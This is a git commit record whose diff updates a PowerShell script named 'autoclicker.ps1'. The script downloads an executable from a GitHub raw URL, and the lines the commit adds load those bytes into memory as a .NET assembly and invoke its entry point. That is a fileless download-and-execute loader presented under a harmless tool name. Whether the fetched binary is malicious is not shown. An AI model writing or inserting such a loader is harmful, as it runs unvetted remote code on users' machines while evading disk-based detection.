d12374ad2eb8ba09358a79460a2c5fdc4d3c399e
angelsegg <thechapmion8236@gmail.com>
2026-01-03 16:00:29 -0500

    Update autoclicker.ps1

--- autoclicker.ps1
+++ autoclicker.ps1
@@ -1,1 +1,5 @@
 $bytes = (Invoke-WebRequest "https://github.com/angelsegg/tttt/raw/refs/heads/main/autoclicker.exe" -UseBasicParsing).Content
+
+$asm = [System.Reflection.Assembly]::Load($bytes)
+
+$asm.EntryPoint.Invoke($null, @([string[]]@()))
